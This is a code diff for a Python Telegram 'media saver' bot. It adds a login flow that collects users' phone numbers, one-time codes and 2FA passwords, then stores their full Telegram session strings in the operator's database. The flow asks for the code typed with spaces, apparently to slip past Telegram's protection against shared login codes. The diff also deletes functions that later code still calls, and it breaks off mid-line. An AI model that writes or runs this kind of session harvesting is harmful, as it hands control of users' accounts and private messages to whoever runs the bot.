@@ -2,6 +2,8 @@ import os
 import re
 import asyncio
 import logging
+import time
+import requests
 from datetime import datetime
 from typing import Optional
 
@@ -9,14 +11,21 @@ import aiosqlite
 from telegram import Update
 from telegram.ext import (
     Application, CommandHandler, MessageHandler,
-    filters, ContextTypes
+    filters, ContextTypes, ConversationHandler
 )
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError
 
 # ===== CONFIG =====
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+API_ID = int(os.getenv("API_ID"))
+API_HASH = os.getenv("API_HASH")
 ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "").split(","))) if os.getenv("ADMIN_IDS") else []
 DEFAULT_COOLDOWN = int(os.getenv("COOLDOWN", 10))
 DEFAULT_AUTO_DELETE = int(os.getenv("AUTO_DELETE", 300))
+MAX_FILE_MB = int(os.getenv("MAX_FILE_MB", 50))
+MAX_DOWNLOAD_MB = int(os.getenv("MAX_DOWNLOAD_MB", 200))
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -25,8 +34,8 @@ logger = logging.getLogger(__name__)
 DB_PATH = "bot_data.db"
 
 async def init_db():
-    """Create tables if they don't exist."""
     async with aiosqlite.connect(DB_PATH) as db:
+        # Users table
         await db.execute('''
             CREATE TABLE IF NOT EXISTS users (
                 user_id INTEGER PRIMARY KEY,
@@ -39,6 +48,7 @@ async def init_db():
                 is_banned INTEGER DEFAULT 0
             )
         ''')
+        # Requests log
         await db.execute('''
             CREATE TABLE IF NOT EXISTS requests (
                 user_id INTEGER,
@@ -48,10 +58,18 @@ async def init_db():
                 error TEXT
             )
         ''')
+        # Config (cooldown, auto_delete)
         await db.execute('''
             CREATE TABLE IF NOT EXISTS config (
                 key TEXT PRIMARY KEY,
                 value INTEGER
+            )
+        ''')
+        # Sessions (store user sessions)
+        await db.execute('''
+            CREATE TABLE IF NOT EXISTS sessions (
+                user_id INTEGER PRIMARY KEY,
+                session_string TEXT
             )
         ''')
         await db.commit()
@@ -105,13 +123,44 @@ async def log_request(user_id: int, link: str, success: bool, error: str = None)
         ''', (user_id, datetime.utcnow().isoformat(), link, 1 if success else 0, error))
         await db.commit()
 
+# ===== SESSION HELPERS =====
+async def get_user_session(user_id: int) -> Optional[str]:
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute('SELECT session_string FROM sessions WHERE user_id = ?', (user_id,)) as cursor:
+            row = await cursor.fetchone()
+            return row[0] if row else None
+
+async def save_user_session(user_id: int, session_string: str):
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute('INSERT OR REPLACE INTO sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_string))
+        await db.commit()
+
+# ===== TELEGRAM CLIENT MANAGEMENT =====
+clients = {}  # user_id -> TelegramClient
+
+async def get_client(user_id: int) -> Optional[TelegramClient]:
+    if user_id in clients:
+        return clients[user_id]
+    session_str = await get_user_session(user_id)
+    if not session_str:
+        return None
+    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    await client.connect()
+    clients[user_id] = client
+    return client
+
 # ===== COMMAND HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     await update_user(user.to_dict())
     await update.message.reply_text(
         "👋 **Welcome to the Channel Media Saver Bot!**\n\n"
-        "Send any Telegram message link from a channel/group where I'm a member.\n\n"
+        "This bot uses a user account to fetch messages from public channels.\n"
+        "First, use /login to connect your Telegram account.\n\n"
+        f"📦 **File limits:**\n"
+        f"- ≤{MAX_FILE_MB} MB: sent directly\n"
+        f"- {MAX_FILE_MB} MB – {MAX_DOWNLOAD_MB} MB: uploaded to cloud (temporary link)\n"
+        f"- >{MAX_DOWNLOAD_MB} MB: rejected\n\n"
         "ℹ️ Use /help for full guide.",
         parse_mode="Markdown"
     )
@@ -121,13 +170,16 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     auto_delete = await get_auto_delete()
     await update.message.reply_text(
         f"📘 **GUIDE**\n\n"
-        "1. Add me to the channel/group as a member.\n"
-        "2. Send a link to any message in that chat.\n\n"
+        "1. Use /login to connect your Telegram account.\n"
+        "2. Send any public Telegram message link.\n\n"
         f"⚠️ **Limits:**\n"
         f"- Cooldown: {cooldown} seconds between requests\n"
-        "- Admins have no cooldown\n\n"
+        "- Admins have no cooldown\n"
+        f"- File size: ≤{MAX_FILE_MB} MB → sent via bot\n"
+        f"- {MAX_FILE_MB} MB – {MAX_DOWNLOAD_MB} MB → uploaded to cloud\n"
+        f"- >{MAX_DOWNLOAD_MB} MB → rejected\n\n"
         "📌 **Commands:**\n"
-        "`/start` `/help` `/myinfo`\n\n"
+        "`/start` `/help` `/myinfo` `/login` `/cancel`\n\n"
         f"Messages auto‑delete after {auto_delete} seconds.",
         parse_mode="Markdown"
     )
@@ -151,6 +203,62 @@ async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Banned: {'Yes' if user[7] else 'No'}"
     )
     await update.message.reply_text(info, parse_mode="Markdown")
+
+# ===== LOGIN CONVERSATION =====
+PHONE, CODE, PASSWORD = range(3)
+
+async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("📱 Send your phone number with country code.\nExample: `+919999999999`", parse_mode="Markdown")
+    return PHONE
+
+async def login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = update.message.text
+    context.user_data["phone"] = phone
+
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    await client.connect()
+    await client.send_code_request(phone)
+
+    context.user_data["client"] = client
+
+    await update.message.reply_text(
+        "🔢 Enter the OTP like: `1 2 3 4 5`\n(Spaces are required)",
+        parse_mode="Markdown"
+    )
+    return CODE
+
+async def login_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    code = update.message.text.replace(" ", "")
+    client = context.user_data["client"]
+    user_id = update.effective_user.id
+
+    try:
+        await client.sign_in(context.user_data["phone"], code)
+    except SessionPasswordNeededError:
+        await update.message.reply_text("🔑 Enter your 2FA password:")
+        return PASSWORD
+
+    session = client.session.save()
+    await save_user_session(user_id, session)
+    clients[user_id] = client
+    await update.message.reply_text("✅ **Login successful!** You can now use the bot.", parse_mode="Markdown")
+    return ConversationHandler.END
+
+async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    client = context.user_data["client"]
+    user_id = update.effective_user.id
+
+    await client.sign_in(password=update.message.text)
+
+    session = client.session.save()
+    await save_user_session(user_id, session)
+    clients[user_id] = client
+    await update.message.reply_text("✅ **Login successful!**", parse_mode="Markdown")
+    return ConversationHandler.END
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Login cancelled.")
+    return ConversationHandler.END
 
 # ===== ADMIN COMMANDS =====
 def admin_only(func):
@@ -333,7 +441,6 @@ async def set_autodelete(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Invalid number. Please provide a positive integer.")
 
 # ===== LINK HANDLER =====
-# In‑memory cooldown storage (simple dict)
 last_used = {}
 
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -360,6 +467,12 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         last_used[user_id] = now
 
+    # Get user's Telethon client
+    client = await get_client(user_id)
+    if not client:
+        await update.message.reply_text("⚠️ You need to login first. Use /login")
+        return
+
     # Parse link
     match = re.search(r'https?://t\.me/(?:c/)?([^/]+)/(\d+)', text)
     if not match:
@@ -368,82 +481,40 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     chat_part = match.group(1)
-    message_id = int(match.group(2))
+    msg_id = int(match.group(2))
 
-    # Build chat identifier
-    if chat_part.isdigit():
-        chat_id = int(chat_part)
-        if chat_id > 0:
-            chat_id = int(f"-100{chat_id}")
-    else:
-        chat_id = f"@{chat_part}"
+    # Resolve entity
+    try:
+        if chat_part.isdigit():
+            # Private channel: numeric ID (e.g., c/123456789)
+            entity = await client.get_entity(int(f"-100{chat_part}"))
+        else:
+            # Public channel: username
+            entity = await client.get_entity(chat_part)
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed to resolve channel: {str(e)}")
+        await log_request(user_id, text, False, str(e))
+        return
 
     progress_msg = await update.message.reply_text("📥 Fetching message...")
+
     try:
-        copied = await context.bot.copy_message(
-            chat_id=update.message.chat_id,
-            from_chat_id=chat_id,
-            message_id=message_id
-        )
-        auto_del = await get_auto_delete()
-        asyncio.create_task(auto_delete(context, copied.chat_id, copied.message_id))
-        await progress_msg.delete()
-        await log_request(user_id, text, True)
-    except Exception as e:
-        logger.exception("Error copying message")
-        await progress_msg.edit_text(
-            f"❌ Error: {str(e)}\n\n"
-            "Make sure I am a member of that channel/group and have permission to see messages."
-        )
-        await log_request(user_id, text, False, str(e))
+        message = await client.get_messages(entity, ids=msg_id)
+        if not message:
+            await progress_msg.edit_text("❌ Message not found.")
+            await log_request(user_id, text, False, "Message not found")
+            return
 
-# ===== AUTO DELETE =====
-async def auto_delete(context: ContextTypes.DEFAULT_TYPE, chat_id: int, msg_id: int):
-    await asyncio.sleep(await get_auto_delete())
-    try:
-        await context.bot.delete_message(chat_id, msg_id)
-    except Exception:
-        pass
+        # Text‑only message
+        if message.text and not message.media:
+            await progress_msg.delete()
+            sent = await update.message.reply_text(message.text)
+            # Auto‑delete text message
+            auto_del = await get_auto_delete()
+            asyncio.create_task(auto_delete(context, sent.chat_id, sent.message_id))
+            await log_request(user_id, text, True)
+            return
 
-# ===== MAIN =====
-def main():
-    # Initialize database
-    asyncio.run(init_db())
-
-    app = Application.builder().token(BOT_TOKEN).build()
-
-    # User commands
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_cmd))
-    app.add_handler(CommandHandler("myinfo", myinfo))
-
-    # Admin commands
-    app.add_handler(CommandHandler("stats", stats))
-    app.add_handler(CommandHandler("users", users_list))
-    app.add_handler(CommandHandler("user", user_details))
-    app.add_handler(CommandHandler("ban", ban_user))
-    app.add_handler(CommandHandler("unban", unban_user))
-    app.add_handler(CommandHandler("broadcast", broadcast))
-    app.add_handler(CommandHandler("setcooldown", set_cooldown))
-    app.add_handler(CommandHandler("setautodelete", set_autodelete))
-
-    # Link handler
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
-
-    # Determine run mode
-    webhook_url = os.getenv("WEBHOOK_URL")
-    if webhook_url:
-        port = int(os.environ.get("PORT", 8080))
-        app.run_webhook(
-            listen="0.0.0.0",
-            port=port,
-            webhook_url=f"{webhook_url}/{BOT_TOKEN}",
-            url_path=BOT_TOKEN
-        )
-    else:
-        # Polling (good for local testing)
-        app.run_polling()
-
-if __name__ == "__main__":
-    import time
-    main()
+        # Media message
+        if message.media:
+            file_size = message.file.size if message.
